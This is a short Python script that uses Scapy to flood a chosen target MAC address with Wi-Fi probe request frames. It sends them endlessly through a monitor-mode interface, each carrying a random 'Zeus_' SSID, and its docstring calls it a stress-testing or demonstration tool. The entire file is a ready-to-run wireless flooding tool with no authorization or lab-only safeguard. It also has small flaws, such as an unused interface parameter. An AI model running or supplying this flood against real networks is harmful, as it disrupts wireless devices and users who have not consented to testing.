#!/usr/bin/env python3
"""Generate a flood of Wi-Fi probe requests using Scapy.

The script crafts random SSIDs and repeatedly sends probe request frames to a
target MAC address.  It can be useful for stress-testing or demonstrating
wireless scanning behavior.  Run with ``--target`` to specify the destination
MAC and ``--iface`` for the monitor mode interface.
"""

import time
import random
import argparse
from scapy.all import sendp, RadioTap, Dot11, Dot11ProbeReq, Dot11Elt, conf


def generate_probe(iface, target_mac):
    ssid = f"Zeus_{random.randint(1000, 9999)}"
    pkt = (
        RadioTap()
        / Dot11(
            type=0, subtype=4, addr1=target_mac, addr2=conf.iface_mac, addr3=target_mac
        )
        / Dot11ProbeReq()
        / Dot11Elt(ID="SSID", info=ssid.encode())
    )
    return pkt


def main():
    parser = argparse.ArgumentParser(description="Scapy Probe Request Flood")
    parser.add_argument("--target", help="Target MAC address", required=True)
    parser.add_argument("--iface", help="Interface in monitor mode", required=True)
    args = parser.parse_args()

    conf.iface = args.iface
    print(f"[+] Starting Probe Request Flood on {args.target} via {args.iface}")
    count = 0

    try:
        while True:
            pkt = generate_probe(args.iface, args.target)
            sendp(pkt, verbose=0)
            count += 1
            if count % 50 == 0:
                print(f"[+] Sent {count} probes...")
            time.sleep(0.05)
    except KeyboardInterrupt:
        print(f"\n[!] Stopped. Total sent: {count}")


if __name__ == "__main__":
    main()
